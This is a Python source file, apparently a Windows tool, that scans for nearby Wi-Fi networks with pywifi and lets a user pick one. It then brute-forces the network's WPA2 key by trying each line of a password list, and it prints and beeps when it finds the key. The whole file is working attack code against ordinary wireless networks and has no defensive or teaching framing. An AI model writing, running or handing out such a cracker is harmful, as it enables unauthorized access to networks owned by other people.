from pywifi import const, PyWiFi, Profile
from Singleton import  MyClass
from termcolor import cprint
from itertools import cycle
from winsound import Beep
from time import sleep
from sys import stdout
import os

wifi = PyWiFi()
interface = wifi.interfaces()[0]
loading_chars = iter(cycle('/-\|'))
colors = iter(cycle(['blue', 'red']))
password_list = "passwordList.txt"
c = MyClass()

def scan():
    interface.scan()
    for i in range(52):
        sleep(.15)
        #stdout.write(f'\r Scanning... {next(loading_chars)}')
    result = interface.scan_results()
    return result


def testwifi(ssid, password):
    interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.connect(interface.add_network_profile(profile))
    sleep(.7)

    if interface.status() == const.IFACE_CONNECTED:
        interface.remove_network_profile(profile)
        return True

    else:
        interface.remove_network_profile(profile)
        return False


os.system('cls')


def getHosts():
    sleep(.5)
    res = ""
    hosts = scan()
    hosts = [host.ssid for host in hosts]
    if hosts:
        for idx, host in enumerate(hosts, 1):
            res += f' {idx}_ {host}\n'
        sleep(1)
    else:
        res += '\n\n No WiFi available!\n'
    return [hosts, res]


def startHack(selected, h):
    selected_host = selected
    hosts = h
    results=""
    while True:
        try:
            selected_host = int(selected_host)
            assert selected_host <= len(hosts) and selected_host > 0
            selected_host -= 1
            break

        except AssertionError:
            print(f'\n "{selected_host}" is not a valid host number')
            results+=f'\n "{selected_host}" is not a valid host number'
            selected_host = input('\n Please enter a valid host: ')

        except:
            if selected_host in hosts:
                selected_host = hosts.index(selected_host)
                break

            else:
                print(f'\n "{selected_host}" is not a valid host name')
                results+=f'\n "{selected_host}" is not a valid host name'
                selected_host = input('\n Please enter a valid host: ')

    target = hosts[selected_host]
    tests = 0
    # print("Attaque du reseau "+target+"\n")

    with open(os.path.realpath(password_list)) as passlist:
        for password in passlist.readlines():
            if len(password) < 8:
                continue
            tests += 1
            #color = next(colors)
            # cprint(f' Test du mot de passe nº{tests}: {password}\n', color=color)
            results+=f' Test du mot de passe nº{tests}: {password}\n'


            if testwifi(target, password):
                Beep(700, 500)
                Beep(1000, 500)
                cprint(f' Mot de passe trouvé: {password}', color='green')
                results+=f' Mot de passe trouvé : {password}'
                # print(f' {tests} Password tested!')
                results+=f' {tests} Password tested!\n'
                break

            c.addResults(results)
            results = ""
    sleep(1)
    # input(' Press enter to exit...')
    # print(f' {tests} Password tested!')
    results += f' {tests} Password tested!\n'
    c.addResults(results)
    c.setIsOver(True)

